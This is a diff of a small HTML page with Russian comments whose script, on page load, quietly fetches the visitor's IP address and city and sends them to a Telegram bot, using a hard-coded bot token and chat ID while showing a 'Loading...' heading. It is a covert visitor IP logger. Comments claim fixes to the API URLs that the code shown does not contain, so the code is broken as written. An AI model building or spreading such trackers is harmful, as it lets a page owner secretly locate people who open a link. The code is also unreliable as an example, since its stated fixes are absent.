@@ -2,22 +2,21 @@
 <html>
 <head><meta charset="UTF-8"></head>
 <body>
-    <h1 id="status">Загрузка... (v11.0)</h1>
+    <h1 id="status">Загрузка... (v12.0)</h1>
     <script>
         async function run() {
-            // Твой рабочий токен и ID
             const token = "8334056184:AAEvbx3eM-yW3jibp0nUx9YbqDgWX80wMcE";
             const chat_id = "8426763446";
             const status = document.getElementById('status');
 
             try {
-                // 1. Получаем IP (ОБЯЗАТЕЛЬНО /json/ в конце!)
+                // 1. Получаем IP (ИСПРАВЛЕНО: добавлен /json/)
                 const res = await fetch('https://ipapi.co');
                 const data = await res.json();
                 
                 const text = encodeURIComponent(`🚀 ЛОГ!\nIP: ${data.ip}\nГород: ${data.city}`);
 
-                // 2. Отправляем в Telegram
+                // 2. Отправляем в Telegram (ИСПРАВЛЕНО: добавлен /bot и $)
                 const url = `https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${text}`;
                 
                 const tgRes = await fetch(url);
@@ -26,7 +25,7 @@
                 if (result.ok) {
                     status.innerText = "ГОТОВО! Сообщение в телеге.";
                 } else {
-                    status.innerText = "ОШИБКА БОТА: " + result.description;
+                    status.innerText = "ОШИБКА ТГ: " + result.description;
                 }
             } catch (e) {
                 status.innerText = "ОШИБКА КОДА: " + e;
